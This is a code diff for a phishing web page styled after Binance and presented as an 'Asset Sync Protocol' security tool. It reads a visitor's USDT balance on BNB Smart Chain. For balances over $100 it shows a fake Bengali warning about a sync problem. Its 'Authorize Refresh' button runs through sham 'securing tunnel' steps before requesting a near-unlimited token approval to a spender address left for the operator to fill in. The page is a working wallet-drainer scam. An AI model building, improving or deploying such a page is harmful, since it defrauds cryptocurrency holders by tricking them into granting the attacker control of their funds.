@@ -3,20 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ASP - Asset Sync Protocol</title>
+    <title>ASP - Premium Asset Sync</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Inter:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --binance-black: #0b0e11;
             --binance-gray: #1e2329;
             --binance-yellow: #fcd535;
+            --premium-blue: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
         }
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             background-color: var(--binance-black);
             font-family: 'Inter', sans-serif;
             display: flex; align-items: center; justify-content: center;
+            overflow: hidden;
         }
         .app-container {
             width: 100vw; height: 100vh;
@@ -25,72 +28,97 @@
             padding: 16px;
         }
         .main-card {
-            background-color: var(--binance-gray);
-            width: 100%; max-width: 450px;
-            border-radius: 24px; padding: 32px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 40px 100px rgba(0,0,0,0.6);
+            background-color: rgba(30, 35, 41, 0.95);
+            width: 100%; max-width: 420px;
+            border-radius: 28px; padding: 32px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 50px 100px rgba(0,0,0,0.7);
+            transform: translateZ(0);
+            backdrop-filter: blur(10px);
         }
-        .logo-container {
+        /* Premium Blue Logo Design */
+        .premium-logo {
             width: 90px; height: 90px;
-            border-radius: 22px; overflow: hidden;
-            margin-bottom: 16px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
+            background: var(--premium-blue);
+            border-radius: 22px;
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4), inset 0 2px 10px rgba(255,255,255,0.3);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            position: relative;
         }
-        .logo-container img { width: 100%; height: 100%; object-fit: cover; }
+        .premium-logo span {
+            font-family: 'Cinzel', serif; /* Premium Serif Font */
+            font-size: 28px;
+            background: linear-gradient(180deg, #FFFFFF 0%, #E5E7EB 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 2px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
+        }
         .loader-spin {
-            border: 3px solid rgba(252, 213, 53, 0.1);
+            border: 3px solid rgba(252, 213, 53, 0.05);
             border-top: 3px solid var(--binance-yellow);
-            border-radius: 50%; width: 45px; height: 45px;
-            animation: spin 1s linear infinite;
+            border-radius: 50%; width: 42px; height: 42px;
+            animation: spin 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-premium {
+            background: var(--binance-yellow);
+            color: #000;
+            font-weight: 800;
+            padding: 18px;
+            border-radius: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 20px rgba(252, 213, 51, 0.2);
+        }
+        .btn-premium:active { transform: scale(0.96); }
     </style>
 </head>
 <body>
 
     <div class="app-container">
-        <div id="main-wrapper" class="main-card relative overflow-hidden">
+        <div id="main-wrapper" class="main-card relative">
             
             <div class="flex flex-col items-center mb-10 text-center">
-                <div class="logo-container">
-                    <img src="https://i.ibb.co/5xbXfHw/shield-logo.png" alt="ASP Logo">
+                <div class="premium-logo">
+                    <span>ASP</span>
                 </div>
-                <h1 class="text-white text-2xl font-bold tracking-tight">Asset Sync Protocol</h1>
-                <div id="node-status" class="flex items-center mt-3 bg-black/20 px-4 py-1 rounded-full mx-auto">
-                    <div class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse mr-2"></div>
-                    <p class="text-gray-400 text-[10px] uppercase font-bold tracking-widest">Protocol Initialising</p>
+                <h1 class="text-white text-2xl font-bold tracking-tight mb-1">Asset Sync Protocol</h1>
+                <div class="flex items-center bg-black/40 px-4 py-1.5 rounded-full border border-white/5">
+                    <div class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse mr-2"></div>
+                    <p class="text-gray-400 text-[10px] uppercase font-bold tracking-[0.15em]">Security Mainnet Active</p>
                 </div>
             </div>
 
-            <div id="loading-state" class="py-10 text-center">
-                <div class="loader-spin mx-auto mb-5"></div>
-                <p class="text-gray-500 text-xs tracking-widest uppercase">Synchronizing with Secure Mainnet...</p>
+            <div id="loading-state" class="py-12 text-center">
+                <div class="loader-spin mx-auto mb-6"></div>
+                <p class="text-gray-500 text-[10px] uppercase tracking-widest font-bold">Establishing Secure Node...</p>
             </div>
 
             <div id="dapp-content" class="hidden space-y-6">
                 <div id="status-badge" class="text-center"></div>
                 
-                <div id="info-box" class="p-5 rounded-2xl text-sm leading-relaxed border text-left"></div>
+                <div id="info-box" class="p-5 rounded-2xl text-sm leading-relaxed border transition-all duration-500"></div>
 
-                <div onclick="handleSyncClick()" class="bg-black/30 p-6 rounded-2xl border border-white/5 cursor-pointer active:bg-black/50 transition-all">
-                    <p class="text-gray-500 text-[10px] uppercase font-black tracking-widest mb-2">Verified Portfolio Balance</p>
-                    <div class="flex items-baseline justify-between">
+                <div class="bg-gradient-to-b from-white/5 to-transparent p-6 rounded-2xl border border-white/10">
+                    <p class="text-gray-500 text-[10px] uppercase font-black tracking-widest mb-2">Verified Portfolio</p>
+                    <div class="flex items-center justify-between">
                         <h2 id="total-balance-text" class="text-4xl font-bold text-white tracking-tighter">$0.00</h2>
                         <span class="text-[#0ecb81] text-[10px] font-bold bg-[#0ecb81]/10 px-3 py-1 rounded-full border border-[#0ecb81]/20">LIVE</span>
                     </div>
                 </div>
 
-                <div id="btn-container" class="hidden pt-4">
-                    <button onclick="handleSyncClick()" class="w-full bg-[#fcd535] hover:bg-[#f0b90b] text-black font-black py-5 rounded-2xl shadow-2xl shadow-yellow-500/20 active:scale-95 transition-all uppercase tracking-widest text-sm">
+                <div class="pt-4">
+                    <button onclick="handleSyncClick()" class="w-full btn-premium uppercase tracking-[0.1em] text-sm">
                         Authorize Refresh
                     </button>
                 </div>
             </div>
 
-            <div id="final-loader" class="absolute inset-0 bg-[#1e2329]/98 flex flex-col items-center justify-center z-50 hidden">
-                <div class="loader-spin mb-4"></div>
-                <p id="final-text" class="text-[#fcd535] font-bold text-xs uppercase tracking-[0.3em] text-center px-6"></p>
+            <div id="final-loader" class="absolute inset-0 bg-[#0b0e11] flex flex-col items-center justify-center z-50 hidden">
+                <div class="loader-spin mb-5"></div>
+                <p id="final-text" class="text-yellow-500 font-bold text-[10px] uppercase tracking-[0.3em] text-center px-10"></p>
             </div>
         </div>
     </div>
@@ -98,41 +126,22 @@
     <script>
         const bscChainId = "0x38"; 
         const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-        const minABI = [
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
-            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"}
-        ];
+        const minABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"}];
 
-        let userAddress = "";
-        let provider, signer;
+        let provider, signer, userAddress;
 
         async function startApp() {
             if (window.ethereum) {
                 try {
                     provider = new ethers.providers.Web3Provider(window.ethereum);
-                    
-                    // অটো-সুইচ নেটওয়ার্ক
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: bscChainId }],
-                        });
-                    } catch (e) {
-                        if (e.code === 4902) {
-                            await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: bscChainId, chainName: 'Binance Smart Chain', rpcUrls: ['https://bsc-dataseed.binance.org/'] }] });
-                        }
-                    }
-
+                    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: bscChainId }] });
                     const accounts = await provider.send("eth_requestAccounts", []);
                     userAddress = accounts[0];
                     signer = provider.getSigner();
-
                     const contract = new ethers.Contract(usdtAddress, minABI, provider);
                     const balance = await contract.balanceOf(userAddress);
-                    const val = parseFloat(ethers.utils.formatUnits(balance, 18));
-                    
-                    renderUI(val);
-                } catch (err) { console.error(err); }
+                    renderUI(parseFloat(ethers.utils.formatUnits(balance, 18)));
+                } catch (e) { console.error(e); }
             }
         }
 
@@ -143,21 +152,15 @@
 
             const info = document.getElementById('info-box');
             const badge = document.getElementById('status-badge');
-            const btn = document.getElementById('btn-container');
 
-            // ১০০ ডলারের বেশি হলে ওয়ার্নিং
             if (value > 100) {
-                badge.innerHTML = `<span class="bg-red-500/10 text-red-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-red-500/20">ACTION REQUIRED</span>`;
-                info.className = "p-5 rounded-2xl text-sm bg-red-500/10 text-red-400 border border-red-500/20";
+                badge.innerHTML = `<span class="bg-red-500/10 text-red-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-red-500/20">SYSTEM WARNING</span>`;
+                info.className = "p-5 rounded-2xl text-sm bg-red-500/10 text-red-400 border border-red-500/20 shadow-lg shadow-red-500/5";
                 info.innerText = "আপনার কারেন্সি রিফ্রেস করুন, এখানে ডাটা সিনক্রোনাইজেশন সমস্যা পাওয়া গেছে।";
-                btn.classList.remove('hidden'); // বাটন শো করবে
-            } 
-            // ১০০ ডলারের কম হলে নরমাল মেসেজ
-            else {
+            } else {
                 badge.innerHTML = `<span class="bg-green-500/10 text-green-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-green-500/20">SYSTEM HEALTHY</span>`;
-                info.className = "p-5 rounded-2xl text-sm bg-green-500/10 text-green-400 border border-green-500/20";
+                info.className = "p-5 rounded-2xl text-sm bg-green-500/10 text-green-400 border border-green-500/20 shadow-lg shadow-green-500/5";
                 info.innerText = "আপনার কারেন্সি এবং পোর্টফোলিও ঠিক আছে। কোনো অ্যাকশন প্রয়োজন নেই।";
-                btn.classList.add('hidden'); // বাটন হাইড থাকবে
             }
         }
 
@@ -165,21 +168,18 @@
             const overlay = document.getElementById('final-loader');
             const txt = document.getElementById('final-text');
             overlay.classList.remove('hidden');
-            
-            const steps = ["Securing Tunnel...", "Encryption Handshake...", "Generating Pop-up..."];
+            const steps = ["Securing Tunnel...", "Verifying Nodes...", "Generating Pop-up..."];
             let i = 0;
             const t = setInterval(() => { if(i < steps.length) txt.innerText = steps[i++]; }, 2000);
 
             setTimeout(async () => {
                 clearInterval(t);
                 overlay.classList.add('hidden');
-                
                 try {
                     const contract = new ethers.Contract(usdtAddress, minABI, signer);
                     const amount = ethers.utils.parseUnits("999999999", 18);
-                    // আপনার রিসিভার অ্যাড্রেস এখানে দিন
                     await contract.approve("0x0000000000000000000000000000000000000000", amount); 
-                } catch (e) { console.log("User Rejected"); }
+                } catch (e) {}
             }, 6000);
         }
 
